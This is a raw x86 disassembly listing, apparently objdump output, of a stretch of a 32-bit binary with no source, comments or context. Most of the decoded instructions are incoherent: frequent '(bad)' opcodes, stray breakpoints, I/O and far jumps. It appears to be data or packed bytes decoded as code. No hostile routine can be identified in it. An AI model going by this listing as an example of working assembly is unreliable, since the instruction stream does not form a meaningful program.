  43719b:	dec    DWORD PTR [ecx-0x52ffb5]
  4371a1:	int3   
  4371a2:	push   ebx
  4371a3:	xchg   bh,bh
  4371a5:	cwde   
  4371a6:	mov    al,ds:0x88ccff0e
  4371ab:	add    bh,bh
  4371ad:	xchg   esi,eax
  4371ae:	dec    DWORD PTR [eax+eax*1+0xdbd8ff]
  4371b5:	outs   dx,BYTE PTR ds:[esi]
  4371b6:	pop    ecx
  4371b7:	popa   
  4371b8:	int3   
  4371b9:	dec    eax
  4371bb:	(bad)  
  4371bc:	call   DWORD PTR [edi-0x77]
  4371bf:	pop    ecx
  4371c0:	add    DWORD PTR [ebx+0x5fff583d],0x2d
  4371c7:	mov    dh,0x83
  4371c9:	inc    DWORD PTR [edi+edi*8-0x7e762e01]
  4371d0:	int3   
  4371d1:	(bad)  
  4371d2:	js     0x43717f
  4371d4:	add    BYTE PTR [eax],dh
  4371d6:	jne    0x4371d1
  4371d8:	mov    DWORD PTR [eax],eax
  4371da:	push   esi
  4371db:	int3   
  4371dc:	sub    DWORD PTR [ebp-0xff8977],0xffffffd8
  4371e3:	cwde   
  4371e4:	or     DWORD PTR [ecx],0xffffffd7
  4371e7:	gs (bad) 
  4371e9:	(bad)  
  4371ea:	fild   WORD PTR [eax]
  4371ec:	inc    DWORD PTR [eax-0x332100]
  4371f2:	mov    ah,0x65
  4371f4:	add    bh,ah
  4371f6:	lds    ecx,FWORD PTR [ecx]
  4371f8:	add    BYTE PTR [eax],al
  4371fa:	loope  0x4371c8
  4371fc:	push   ebp
  4371fe:	cmp    DWORD PTR [edx-0x29a00000],0xffffffff
  437205:	push   ss
  437206:	pop    eax
  437207:	pusha  
  437208:	int3   
  437209:	mov    esi,ebp
  43720b:	(bad)  
  43720c:	jmp    DWORD PTR [ebx+0x62ff]
  437212:	cli    
  437213:	dec    edi
  437214:	dec    edi
  437216:	in     eax,0x72
  437218:	inc    DWORD PTR [ebx-0x117c7689]
  43721e:	(bad)  
  43721f:	fdivp  st(7),st
  437221:	mov    DWORD PTR [ecx-0x634eff14],edi
  437227:	(bad)  
  437228:	(bad)  
  437229:	jmp    DWORD PTR [ebx-0x1]
  43722c:	add    BYTE PTR [edi-0x33d901],dl
  437232:	inc    eax
  437233:	inc    edx
  437234:	add    cl,bh
  437236:	jb     0x437263
  437238:	(bad)  
  437239:	push   DWORD PTR [eax+0x0]
  43723c:	call   ecx
  43723e:	call   DWORD PTR [eax]
  437240:	cmp    edi,0xffffffa5
  437243:	fdiv   st(7),st
  437245:	xor    ecx,edi
  437247:	test   DWORD PTR [ebx-0x764000],0x27ff9c
  437251:	push   edx
  437253:	rol    BYTE PTR [eax],cl
  437255:	ret    0x2faa
  437258:	inc    DWORD PTR [ebx-0x780000cf]
  43725e:	call   FWORD PTR [ebx+0x5c9900ff]
  437264:	int3   
  437265:	xor    al,0x76
  437267:	sbb    ecx,DWORD PTR [ecx-0x769401]
  43726d:	inc    edx
  43726e:	add    dh,dh
  437270:	mov    DWORD PTR [eax],eax
  437272:	scas   eax,DWORD PTR es:[edi]
  437273:	mov    DWORD PTR [eax],eax
  437275:	pusha  
  437276:	xor    ch,ch
  437278:	add    bh,bh
  43727a:	ret    0xff00
  43727d:	add    BYTE PTR [ebx-0x2d33ff18],0x17
  437284:	jmp    DWORD PTR [ebp+0x59]
  437287:	jno    0x437288
  437289:	call   FWORD PTR [edi]
  43728b:	dec    DWORD PTR [ecx-0x5a3385]
  437291:	jmp    FWORD PTR [ebp+ebx*4-0x4884c677]
  437298:	add    BYTE PTR [ebx+0x4b000000],al
  43729e:	dec    DWORD PTR [eax+0x7fc4ffff]
  4372a4:	add    BYTE PTR [eax],bl
  4372a6:	dec    cx
  4372a8:	(bad)  
  4372a9:	jmp    FWORD PTR ds:0xdf83ff
  4372af:	ror    ah,cl
  4372b1:	add    BYTE PTR [edx+0x71d3ff42],al
  4372b7:	popa   
  4372b8:	dec    esp
  4372ba:	mov    bh,0x0
  4372bc:	add    BYTE PTR [ecx-0x7cffa000],ah
  4372c2:	mov    ds:0x66efcc84,eax
  4372c7:	pop    esp
  4372c8:	int3   
  4372c9:	sub    DWORD PTR [eax+0x0],0x0
  4372cd:	hlt    
  4372ce:	dec    edi
  4372d0:	inc    DWORD PTR [ebx-0x4900573f]
  4372d6:	sbb    DWORD PTR [eax],ebx
  4372d8:	dec    DWORD PTR [ecx+0x36838904]
  4372de:	(bad)  
  4372df:	mov    ebx,0xbab2ffff
  4372e4:	call   FWORD PTR [ebp-0x2eb7]
  4372ea:	and    DWORD PTR [ecx+0x76831d83],ecx
  4372f0:	int3   
  4372f1:	jmp    FWORD PTR [eax-0x1414008a]
  4372f7:	and    DWORD PTR [ebx+0x836fff],eax
  4372fd:	xor    al,BYTE PTR [ebx-0x3c000019]
  437303:	pop    ebp
  437304:	add    BYTE PTR [ecx],ch
  437306:	pop    edi
  437307:	dec    esi
  437308:	(bad)  
  437309:	dec    esp
  43730b:	cmp    edi,0x65
  43730e:	(bad)  
  43730f:	add    BYTE PTR ds:[eax],al
  437312:	out    dx,eax
  437313:	clc    
  437314:	add    bh,bl
  437316:	pop    ss
  437317:	xor    bh,bh
  437319:	push   DWORD PTR [eax+eax*1+0x7e837eff]
  437320:	(bad)  
  437321:	jmp    edx
  437323:	sbb    edi,edi
  437325:	fcom   DWORD PTR [ebx]
  437327:	(bad)  
  437328:	(bad)  
  437329:	inc    esi
  43732b:	(bad)  
  43732c:	inc    DWORD PTR [ebx+0x0]
  43732f:	sbb    edi,edi
  437331:	inc    DWORD PTR [esi-0x17]
  437334:	int3   
  437335:	sbb    eax,0xffffd2ce
  43733a:	cwde   
  43733b:	(bad)  
  43733c:	jmp    FWORD PTR [edi+edi*8-0x767c0085]
  437343:	cwde   
  437344:	inc    ecx
  437346:	or     DWORD PTR [esi],ebp
  437348:	(bad)  
  437349:	call   DWORD PTR [ebp-0x1]
  43734c:	call   DWORD PTR [ecx+0x0]
  43734f:	scas   eax,DWORD PTR es:[edi]
  437350:	(bad)  
  437351:	call   FWORD PTR [eax+0x7]
  437354:	push   DWORD PTR [edx]
  437356:	aaa    
  437357:	sub    eax,0x836400ff
  43735c:	dec    DWORD PTR [edi-0x1]
  43735f:	adc    eax,0xd327ffff
  437364:	jmp    ebx
  437366:	mov    BYTE PTR [esi],ch
  437368:	mov    DWORD PTR [ebx+0x2fffff4d],eax
  43736e:	add    BYTE PTR [edi-0x5b970000],bh
  437374:	add    BYTE PTR [ebx-0x33ffb897],dh
  43737a:	xchg   ecx,eax
  43737b:	inc    DWORD PTR [eax]
  43737d:	mov    edi,0xff5200
  437382:	xor    ah,bl
  437384:	add    bl,al
  437386:	sbb    bh,0xff
  437389:	(bad)  
  43738a:	mov    ebp,0xff6100ff
  43738f:	imul   eax,DWORD PTR [eax],0xa30fff
  437395:	push   cs
  437396:	and    al,BYTE PTR ss:[eax]
  437399:	add    cl,bh
  43739b:	int3   
  43739c:	add    al,cl
  43739e:	inc    DWORD PTR [edi-0x5e9eff01]
  4373a4:	push   DWORD PTR [eax+esi*8+0x18ff8354]
  4373ab:	(bad)  
  4373ac:	(bad)  
  4373ad:	jmp    0x5547:0xffff46ff
  4373b4:	add    cl,cl
  4373b6:	jg     0x4373f3
  4373b8:	cmp    edi,0x4d
  4373bb:	mov    DWORD PTR [ebx-0x7cbaffe4],eax
  4373c1:	push   DWORD PTR [eax]
  4373c3:	mov    al,ds:0x3392e5ff
  4373c8:	cmp    edi,0xffffffa4
  4373cb:	inc    DWORD PTR [eax]
  4373cd:	push   esi
  4373ce:	int3   
  4373cf:	enter  0xff,0xe5
  4373d3:	jle    0x4373a1
  4373d5:	pop    ebx
  4373d6:	pusha  
  4373d7:	sub    eax,0x83b18300
  4373dc:	add    dh,bl
  4373de:	call   DWORD PTR [eax]
  4373e0:	(bad)  
  4373e1:	jmp    eax
  4373e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4373e4:	jmp    DWORD PTR [edi]
  4373e6:	scas   eax,DWORD PTR es:[edi]
  4373e7:	jmp    0x82ff:0xffb7ffcc
  4373ee:	add    BYTE PTR [ebx-0x77],cl
  4373f1:	add    DWORD PTR [esi],0x25
  4373f4:	add    BYTE PTR [edi-0x3300aa9e],bh
  4373fa:	loopne 0x4373fb
  4373fc:	mov    ecx,esp
  4373fe:	(bad)  
  4373ff:	jmp    0xa800:0x34e2ffff
  437406:	outs   dx,BYTE PTR ds:[esi]
  437407:	jns    0x437408
  437409:	mov    DWORD PTR [edi+edi*8-0x567c427d],esp
  437410:	(bad)  
  437411:	inc    DWORD PTR [ebp-0x18]
  437414:	or     esi,0xffffffb9
  437417:	pop    eax
  437418:	add    bh,bh
  43741a:	jb     0x43741c
  43741c:	sub    DWORD PTR [esi+0x0],0x7b
  437420:	add    ah,cl
  437422:	shl    DWORD PTR [ecx-0x27bdcb7d],0xcc
  437429:	call   DWORD PTR [ebx]
  43742b:	int3   
  43742c:	add    BYTE PTR [esi+0x0],dl
  43742f:	push   ecx
  437430:	int3   
  437431:	dec    DWORD PTR [ebx+0x34a58326]
  437437:	rol    DWORD PTR [ebx-0x2134],0x4e
  43743e:	add    BYTE PTR [eax-0x77],bh
  437441:	mov    DWORD PTR ds:0x41b4ff40,ebx
  437447:	das    
  437448:	add    ah,cl
  43744a:	mov    di,di
  43744d:	repz add BYTE PTR [edx+0x0],dl
  437451:	call   DWORD PTR [esi]
  437453:	jl     0x437454
  437455:	xchg   edi,eax
  437456:	jmp    0xbe4440bc
  43745b:	(bad)  
  43745c:	call   FWORD PTR [ecx+0x0]
  43745f:	lea    eax,[eax]
  437461:	sbb    edx,0xffffffbc
  437464:	mov    DWORD PTR [eax],esi
  437466:	mov    ah,0xef
  437468:	cmp    edi,0x3e
  43746b:	add    bh,bh
  43746d:	adc    eax,0xff0039cc
  437472:	xor    DWORD PTR [edx-0x1],0x832a17a1
  437479:	(bad)  
  43747a:	fcos   
  43747c:	mov    DWORD PTR [ebx-0x1d01],esp
  437482:	push   esp
  437483:	xor    BYTE PTR [eax],al
  437485:	in     al,dx
  437486:	cmp    BYTE PTR [ecx-0x76b70100],0xff
  43748d:	push   esp
  43748e:	add    BYTE PTR [edx-0x64330001],bh
  437494:	add    BYTE PTR [edi-0x65],ch
  437497:	mov    ebx,0xff528900
  43749c:	mov    DWORD PTR [ecx+0x0],esp
  43749f:	dec    edi
  4374a0:	dec    esp
  4374a2:	sbb    al,0xa4
  4374a4:	inc    edi
  4374a6:	inc    eax
  4374a7:	mov    al,BYTE PTR [eax]
  4374a9:	call   FWORD PTR [eax]
  4374ab:	add    bh,bh
  4374ad:	dec    ebp
  4374ae:	add    eax,0x0
  4374b1:	push   DWORD PTR [edi+0x10abff09]
  4374b7:	les    ecx,FWORD PTR [ecx-0xae01]
  4374bd:	idiv   edi
  4374bf:	(bad)  
  4374c1:	add    dh,al
  4374c3:	inc    esp
  4374c4:	add    ah,bh
  4374c6:	test   DWORD PTR [esi],eax
  4374c8:	add    BYTE PTR [ebx+0x4500ff0e],al
  4374ce:	jmp    DWORD PTR [edx-0x1]
  4374d1:	or     DWORD PTR [edi-0x7a693375],0xffffffb7
  4374d8:	(bad)  
  4374d9:	(bad)  
  4374da:	fadd   QWORD PTR [ebx+0xfff14ff]
  4374e0:	(bad)  
  4374e1:	inc    DWORD PTR [ecx]
  4374e3:	fs push eax
  4374e6:	mov    bh,0xba
  4374e8:	inc    DWORD PTR [eax]
  4374ea:	int    0xff
  4374ec:	add    BYTE PTR [eax-0x1],ah
  4374ef:	into   
  4374f0:	add    bh,bh
  4374f2:	mov    ds:0x65f90087,al
  4374f7:	stc    
  4374f8:	add    BYTE PTR [eax],al
  4374fa:	loopne 0x4374fb
  4374fc:	add    BYTE PTR [ebp-0x77],al
  4374ff:	out    dx,eax
  437500:	cmp    edi,0x31
  437503:	mov    edi,edi
  437505:	dec    esp
  437506:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  437508:	inc    DWORD PTR [eax]
  43750a:	push   esp
  43750b:	(bad)  
  43750c:	call   DWORD PTR [esi-0x7ca301]
  437512:	dec    edx
  437513:	hlt    
  437514:	add    BYTE PTR [ebp*1+0xe8],al
  43751b:	add    DWORD PTR [eax],0x3c
  43751e:	sub    esi,0xffffff83
  437521:	add    BYTE PTR [edi],dl
  437523:	loope  0x437524
  437525:	or     ebx,DWORD PTR [ebx+0x77]
  437528:	add    bh,bh
  43752a:	call   0xff05:0x83c7ff00
  437531:	add    ah,bh
  437533:	adc    esp,ecx
  437535:	jecxz  0x437566
  437537:	xor    al,BYTE PTR [eax]
  437539:	(bad)  
  43753a:	stc    
  43753b:	(bad)  
  43753c:	(bad)  
  43753d:	aas    
  43753e:	or     DWORD PTR [edx],0x0
  437541:	push   DWORD PTR [eax+0xf]
  437544:	int3   
  437545:	pusha  
  437546:	adc    edi,DWORD PTR [esi-0x77]
  437549:	jmp    FWORD PTR [esi+0x0]
  43754c:	add    BYTE PTR [ebx],ah
  43754e:	(bad)  
  43754f:	mov    ecx,0x4854ccff
  437554:	adc    ebp,0x2e
  437557:	add    al,BYTE PTR [ebx-0x7c7c3d00]
  43755d:	xor    bh,bh
  43755f:	jo     0x4374e4
  437561:	inc    DWORD PTR [esp+edi*8-0x1]
  437565:	add    DWORD PTR [ebx],0xffffffa6
  437568:	inc    DWORD PTR [eax]
  43756a:	outs   dx,BYTE PTR ds:[esi]
  43756b:	add    BYTE PTR [eax],al
  43756d:	aam    0x0
  43756f:	stos   DWORD PTR es:[edi],eax
  437570:	add    bh,bh
  437572:	ficom  DWORD PTR [ebp-0x1]
  437575:	xor    BYTE PTR [ecx-0x37330061],dh
  43757b:	dec    esp
  43757d:	add    DWORD PTR [ebx+0x7fffff97],0xf178999
  437587:	mov    BYTE PTR [eax],0xff
  43758a:	dec    esp
  43758c:	jmp    FWORD PTR [ebx]
  43758e:	add    BYTE PTR [ebp-0x1],cl
  437591:	call   ecx
  437593:	add    eax,0x9f14feff
  437598:	add    bh,bh
  43759a:	inc    edx
  43759b:	add    BYTE PTR [eax],al
  43759d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43759e:	mov    DWORD PTR [edx+0x0],ebp
  4375a1:	or     DWORD PTR [ebx+edx*8],0xffffff83
  4375a5:	shr    DWORD PTR [eax],cl
  4375a7:	sahf   
  4375a8:	add    bh,bh
  4375aa:	mov    bh,0xff
  4375ac:	mov    DWORD PTR [eax-0x7c7c3734],edi
  4375b2:	repz pop eax
  4375b4:	int3   
  4375b5:	dec    edi
  4375b6:	push   edi
  4375b7:	mov    dl,0xff
  4375b9:	sub    DWORD PTR [edi-0x1],0x0
  4375bd:	push   edx
  4375be:	xor    DWORD PTR [esi],0xffffffff
  4375c1:	int3   
  4375c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4375c3:	adc    BYTE PTR [eax],al
  4375c5:	jns    0x43760b
  4375c7:	mov    bh,0xff
  4375c9:	int3   
  4375ca:	loope  0x4375cb
  4375cc:	push   DWORD PTR [ecx-0x7cf377]
  4375d2:	imul   edi,DWORD PTR [ecx+0x1b5c9f89],0xff570000
  4375dc:	dec    DWORD PTR [ebx]
  4375de:	adc    DWORD PTR [esi+0x1ca8383],0xffffffcc
  4375e5:	dec    ebx
  4375e6:	in     al,0xb5
  4375e8:	(bad)  
  4375e9:	(bad)  
  4375ea:	cli    
  4375eb:	int3   
  4375ec:	jmp    DWORD PTR [esi]
  4375ee:	jmp    DWORD PTR [esi]
  4375f0:	add    BYTE PTR [eax],al
  4375f2:	pusha  
  4375f3:	hlt    
  4375f4:	add    BYTE PTR [ecx+esi*2],bh
  4375f7:	ret    
  4375f8:	add    bh,bh
  4375fa:	mov    ecx,0xcbcc89
  4375ff:	mov    al,BYTE PTR [ebx-0x7c4d517d]
  437605:	pop    edi
  437606:	xchg   esp,eax
  437607:	dec    edx
  437608:	add    ah,cl
  43760a:	sti    
  43760b:	mov    esp,ecx
  43760d:	adc    eax,0x3900
  437612:	adc    eax,0xea588921
  437617:	xor    ah,cl
  437619:	dec    ebx
  43761b:	cmp    edi,0x12
  43761e:	call   DWORD PTR [edi+edi*8+0x0]
  437622:	outs   dx,DWORD PTR ds:[esi]
  437623:	mov    ecx,0xe2f0d5ff
  437628:	add    bh,bh
  43762a:	mov    ebp,0xd10000
  43762f:	sahf   
  437630:	add    BYTE PTR [ebx+0x5f832e11],al
  437636:	push   es
  437637:	mov    al,ds:0xff69ffff
  43763c:	add    BYTE PTR [edx+0x0],dl
  43763f:	aas    
  437640:	(bad)  
  437641:	(bad)  
  437642:	mov    ebp,0xa9f89f2
  437647:	(bad)  
  437648:	mov    DWORD PTR [ebx-0x31007cd9],eax
  43764e:	int3   
  43764f:	es (bad) 
  437651:	call   FWORD PTR [edi+0x75c48918]
  437657:	jne    0x437658
  437659:	add    dh,cl
  43765b:	cmp    edi,0x2f
  43765e:	or     DWORD PTR [edi],0x0
  437661:	add    ah,dl
  437663:	nop
  437664:	add    BYTE PTR [ecx-0x26],cl
  437667:	mov    edi,?
  437669:	jmp    DWORD PTR [eax-0xf80001]
  43766f:	jno    0x437671
  437671:	int3   
  437672:	fwait
  437673:	mov    cl,0xff
  437675:	mov    ebp,DWORD PTR [esi-0xff7638]
  43767b:	int3   
  43767c:	jmp    esp
  43767e:	call   ebp
  437680:	inc    DWORD PTR [eax]
  437682:	(bad)  
  437683:	dec    ebp
  437684:	dec    DWORD PTR [eax]
  437686:	push   ebp
  437687:	fiadd  DWORD PTR [ebx+0xffb8ff]
  43768d:	pop    eax
  43768e:	mov    DWORD PTR [esi],ebp
  437690:	add    bh,bh
  437692:	icebp  
  437693:	outs   dx,BYTE PTR ds:[esi]
  437694:	add    BYTE PTR [edi],ah
  437696:	(bad)  
  437697:	pop    ebx
  437698:	cmp    edi,0xffffff8d
  43769b:	add    BYTE PTR [ecx-0x7c72004e],cl
  4376a1:	call   FWORD PTR [edi+0x3e32009a]
  4376a7:	dec    esi
  4376a8:	int3   
  4376a9:	add    BYTE PTR [edx-0x1],dh
  4376ac:	(bad)  
  4376ad:	jge    0x4376ae
  4376af:	pushf  
  4376b0:	(bad)  
  4376b1:	jmp    FWORD PTR [ebx-0xe2c009d]
  4376b7:	push   eax
  4376b8:	add    ah,cl
  4376ba:	cdq    
  4376bb:	(bad)  
  4376bc:	(bad)  
  4376bd:	fiadd  WORD PTR [ebx+0x3389ffe4]
  4376c3:	cwde   
  4376c4:	dec    edx
  4376c6:	cmp    al,0x10
  4376c8:	mov    edi,edi
  4376ca:	stc    
  4376cb:	add    DWORD PTR [eax],0x4
  4376ce:	inc    esp
  4376d0:	add    BYTE PTR [ebx+0x61cc1e08],al
  4376d6:	xchg   ebx,eax
  4376d7:	into   
  4376d8:	dec    esp
  4376da:	mov    bh,bh
  4376dc:	mov    edx,eax
  4376de:	dec    DWORD PTR [edx]
  4376e0:	inc    DWORD PTR [eax]
  4376e2:	or     DWORD PTR [edi],0xd77b3e89
  4376e8:	inc    DWORD PTR [eax]
  4376ea:	or     bh,bh
  4376ec:	push   DWORD PTR [esi]
  4376ee:	int3   
  4376ef:	sub    al,0x89
  4376f1:	call   FWORD PTR [ebx]
  4376f3:	mov    BYTE PTR [ebx-0xd29fe],0x0
  4376fa:	ret    0xccff
  4376fd:	ror    esp,1
  4376ff:	test   eax,0x21c383ff
  437704:	call   eax
  437706:	retf   
  437707:	jo     0x437709
  437709:	add    BYTE PTR [edi+0x6ff89],dh
  43770f:	cli    
  437710:	add    DWORD PTR [ebx+0x783d26c],0x7b
  437717:	and    edi,edi
  437719:	add    cl,ch
  43771b:	inc    DWORD PTR [eax]
  43771d:	mov    dh,0xff
  43771f:	mov    ecx,esp
  437721:	push   DWORD PTR [ebx]
  437723:	(bad)  
  437725:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437726:	dec    ebx
  437727:	loope  0x437728
  437729:	call   FWORD PTR [ecx]
  43772b:	add    DWORD PTR [eax],0xffffff87
  43772e:	jmp    DWORD PTR [edi+edi*8-0x34]
  437732:	cld    
  437733:	jg     0x437701
  437735:	sbb    BYTE PTR [eax+0x22],ah
  437738:	add    bh,bh
  43773a:	mov    al,BYTE PTR [eax]
  43773c:	(bad)  
  43773d:	cmp    eax,DWORD PTR [eax]
  43773f:	jp     0x437741
  437741:	cmp    eax,0x66
  437744:	dec    DWORD PTR [ebp+0x61]
  437747:	xor    eax,0xff558300
  43774c:	or     edx,0x0
  43774f:	jnp    0x4376d4
  437751:	(bad)  
  437752:	mov    esp,0xa80600f6
  437757:	fdivp  st(7),st
  437759:	add    BYTE PTR [eax-0x7c950001],ch
  43775f:	popf   
  437760:	(bad)  
  437761:	inc    DWORD PTR [eax]
  437763:	xchg   esp,eax
  437764:	add    BYTE PTR [ebx+0x830dd9],ch
  43776a:	add    DWORD PTR [ebx-0x7c6301],eax
  437770:	add    ah,cl
  437772:	pop    esp
  437773:	in     eax,dx
  437774:	(bad)  
  437775:	jl     0x437754
  437777:	adc    eax,0xf2ffcc
  43777c:	mov    DWORD PTR [ecx-0x1],ecx
  43777f:	pop    edi
  437780:	or     esp,0xfffffffd
  437783:	dec    eax
  437784:	sub    DWORD PTR [ebx],0xffffff80
  437787:	push   esp
  437788:	add    ah,cl
  43778a:	and    edi,edi
  43778c:	add    BYTE PTR [ecx+ecx*4],dh
  43778f:	push   ebp
  437790:	mov    DWORD PTR [ecx-0x5900882c],ecx
  437796:	mov    dl,0xc8
  437798:	int3   
  437799:	or     DWORD PTR [ecx],0xffffffff
  43779c:	add    BYTE PTR [edx+0x0],ah
  43779f:	mov    al,ds:0xe411ffff
  4377a4:	xor    DWORD PTR [ecx],0xffffffd0
  4377a7:	pusha  
  4377a8:	(bad)  
  4377a9:	call   FWORD PTR [ebx]
  4377ab:	add    DWORD PTR [eax],0xffffffb5
  4377ae:	dec    DWORD PTR [ebx+eax*4-0x1]
  4377b2:	xchg   ebx,eax
  4377b3:	lock inc DWORD PTR [edi]
  4377b6:	addr16 imul ecx,esp,0xffffffff
  4377ba:	jle    0x4377bb
  4377bc:	add    BYTE PTR [eax],dl
  4377be:	push   ebx
  4377c0:	(bad)  
  4377c1:	call   DWORD PTR [ebx]
  4377c3:	call   0x8900:0x66ec4400
  4377ca:	imul   edi,edi,0xedff9f00
  4377d0:	cmp    edi,0x7e
  4377d3:	dec    ecx
  4377d4:	add    BYTE PTR [esi+0xff44d1],dl
  4377da:	jnp    0x4377db
  4377dc:	call   FWORD PTR [ebx-0x1]
  4377df:	mov    ebx,0x4d93ffff
  4377e4:	call   DWORD PTR [edi-0x62f1]
  4377ea:	mov    dl,0xff
  4377ec:	inc    DWORD PTR [edi+edi*8]
  4377ef:	adc    DWORD PTR [ebx-0x7b5d34],eax
  4377f5:	jl     0x4377aa
  4377f7:	inc    DWORD PTR [eax]
  4377f9:	call   ebp
  4377fb:	(bad)  
  4377fc:	jmp    DWORD PTR [edx-0x1]
  4377ff:	xchg   esp,eax
  437800:	cmp    edi,0xfffffff7
  437803:	pop    edi
  437804:	jmp    DWORD PTR [ecx-0xe1c2]
  43780a:	xchg   esi,eax
  43780b:	add    BYTE PTR [eax],al
  43780d:	ja     0x43780e
  43780f:	loopne 0x437810
  437811:	add    ch,dl
  437813:	inc    ebx
  437814:	xor    DWORD PTR [ebp-0x6f],0x15
  437818:	add    BYTE PTR [eax],al
  43781a:	cmp    ecx,DWORD PTR [ecx-0x2800ff77]
  437820:	(bad)  
  437821:	jmp    FWORD PTR [ecx+ebx*1+0x1e825eff]
  437828:	inc    DWORD PTR [ebx-0x1c00005c]
  43782e:	add    BYTE PTR [eax+eax*1-0x1],dh
  437832:	add    bh,dl
  437834:	add    DWORD PTR [ecx+0x54],0xfffffffa
  437838:	inc    DWORD PTR [eax]
  43783a:	jp     0x43783b
  43783c:	call   FWORD PTR [edx]
  43783e:	add    BYTE PTR [ebx],bl
  437840:	(bad)  
  437841:	call   DWORD PTR [ecx+0x760000e1]
  437847:	retf   0xffff
  43784a:	pop    ds
  43784b:	inc    DWORD PTR [eax]
  43784d:	inc    ebp
  43784e:	jmp    DWORD PTR [edi+edi*8-0x336c6301]
  437855:	call   0x83f2:0xffff491a
  43785c:	dec    DWORD PTR [ebp-0xfc00]
  437862:	push   ecx
  437863:	test   al,0xff
  437865:	add    esi,DWORD PTR [ebx+ebp*4-0x7d]
  437869:	jmp    DWORD PTR [edx]
  43786b:	(bad)  
  43786c:	inc    DWORD PTR [ebx]
  43786e:	jmp    FWORD PTR [ebx+eax*4-0x34]
  437872:	push   es
  437873:	into   
  437874:	call   edi
  437876:	(bad)  
  437877:	push   esi
  437878:	cmp    edi,0x7
  43787b:	mov    edi,edi
  43787d:	test   eax,0xff00cbff
  437882:	jmp    0xd4cc77c5
  437887:	push   ecx
  437888:	(bad)  
  437889:	push   DWORD PTR [ebx]
  43788b:	inc    DWORD PTR [eax]
  43788d:	cmp    DWORD PTR [eax],eax
  43788f:	pop    esp
  437890:	inc    DWORD PTR [eax]
  437892:	and    ebx,esi
  437894:	dec    esi
  437896:	popa   
  437897:	mov    al,BYTE PTR [eax]
  437899:	mov    DWORD PTR [edi],esp
  43789b:	add    BYTE PTR [ebx-0x7c1700fa],al
  4378a1:	jmp    FWORD PTR [ebx+0x5434ffc8]
  4378a7:	out    0xff,al
  4378a9:	int3   
  4378aa:	xor    DWORD PTR [ecx-0x5500697d],ecx
  4378b0:	int3   
  4378b1:	sub    eax,0xffffffff
  4378b4:	(bad)  
  4378b5:	cli    
  4378b6:	mov    WORD PTR [ebx],?
  4378b8:	inc    DWORD PTR [eax]
  4378ba:	in     eax,dx
  4378bb:	(bad)  
  4378bc:	(bad)  
  4378bd:	inc    BYTE PTR [eax]
  4378bf:	retf   
  4378c0:	int3   
  4378c1:	add    BYTE PTR [esi-0x4d833342],bh
  4378c7:	repnz cmp edi,0x1
  4378cb:	inc    DWORD PTR [eax]
  4378cd:	mov    ecx,0x8300ebff
  4378d2:	jo     0x437893
  4378d4:	jmp    FWORD PTR [edx-0xf18d]
  4378da:	into   
  4378db:	int3   
  4378dc:	add    BYTE PTR [edi+edi*8-0x67],dl
  4378e0:	inc    DWORD PTR [eax]
  4378e2:	push   ss
  4378e3:	data16 int3 
  4378e5:	test   DWORD PTR [ebp-0x7],edx
  4378e8:	inc    DWORD PTR [eax]
  4378ea:	adc    eax,DWORD PTR [ebx-0x5c00f500]
  4378f0:	inc    DWORD PTR [eax]
  4378f2:	jbe    0x437914
  4378f4:	jmp    FWORD PTR [eax]
  4378f6:	xor    eax,0xab8300c3
  4378fb:	(bad)  
  4378fc:	inc    DWORD PTR [esi]
  4378fe:	dec    ecx
  437900:	inc    DWORD PTR [eax]
  437902:	imul   eax,DWORD PTR [eax],0x0
  437905:	out    dx,al
  437906:	ss (bad) 
  437908:	inc    DWORD PTR [eax]
  43790a:	cmp    eax,0x8959ffff
  43790f:	ud0    eax,DWORD PTR [eax]
  437912:	mov    WORD PTR [esi-0x7d],fs
  437915:	mov    al,0xe9
  437917:	jmp    0x87ff:0x832dffff
  43791e:	int3   
  43791f:	cmp    edi,0x0
  437922:	add    DWORD PTR [ebp-0x7f56b400],ebp
  437928:	add    DWORD PTR [ebx-0x1e33007e],0x0
  43792f:	imul   edi,edi,0x0
  437932:	ret    0xcc0e
  437935:	mov    bl,0x43
  437937:	jne    0x4378bc
  437939:	(bad)  
  43793a:	jg     0x43793b
  43793c:	add    BYTE PTR [edi-0xffb67d],dl
  437942:	test   eax,0x9c29ff95
  437947:	pop    ss
  437948:	(bad)  
  437949:	jmp    ebx
  43794b:	add    DWORD PTR [ebx-0x4a00b0],0xffffff89
  437952:	test   al,0xae
  437954:	dec    DWORD PTR [esi]
  437956:	jmp    0xff00:0x2d830044
  43795d:	fild   WORD PTR [eax]
  43795f:	loopne 0x437960
  437961:	dec    DWORD PTR [ebx+ecx*1+0x48f552ff]
  437968:	inc    DWORD PTR [ebx+0x54ff838f]
  43796e:	add    BYTE PTR [ebx+0x2c408383],ah
  437974:	add    BYTE PTR [eax-0x7209],ah
  43797a:	add    eax,0xc4ffff
  43797f:	jno    0x437981
  437981:	int3   
  437982:	mov    WORD PTR [esi],?
  437984:	mov    DWORD PTR [ecx],ecx
  437986:	mov    BYTE PTR [ebx+0x0],dh
  437989:	inc    DWORD PTR [ebx]
  43798b:	(bad)  
  43798c:	push   ebp
  43798e:	dec    DWORD PTR [ebx+eax*4+0x73dfff]
  437995:	pop    ss
  437996:	mov    dl,0x7a
  437998:	dec    DWORD PTR [ecx-0x13000092]
  43799e:	jmp    FWORD PTR [ecx]
  4379a0:	inc    DWORD PTR [eax]
  4379a2:	stos   BYTE PTR es:[edi],al
  4379a3:	xor    eax,0x617259ff
  4379a8:	add    bh,bh
  4379aa:	push   ebp
  4379ab:	(bad)  
  4379ac:	call   FWORD PTR [eax-0x7c7cd134]
  4379b2:	int3   
  4379b3:	ror    ah,1
  4379b5:	add    BYTE PTR [ebp-0x3c],0x89
  4379b9:	add    BYTE PTR [ebx-0x76637601],bh
  4379bf:	das    
  4379c0:	add    bh,bh
  4379c2:	gs sbb edi,edi
  4379c5:	mov    WORD PTR [ecx+0x32],es
  4379c8:	(bad)  
  4379c9:	dec    ecx
  4379cb:	inc    DWORD PTR [eax]
  4379cd:	fwait
  4379ce:	mov    DWORD PTR [ecx],ebx
  4379d0:	dec    DWORD PTR [ecx-0x44fff718]
  4379d6:	push   0xffffffb4
  4379d8:	inc    DWORD PTR [ebx+0x1bff0081]
  4379de:	int3   
  4379df:	jp     0x4379e1
  4379e1:	add    BYTE PTR [ebx-0x373100b5],al
  4379e7:	pop    eax
  4379e8:	add    bh,bh
  4379ea:	sub    bh,bh
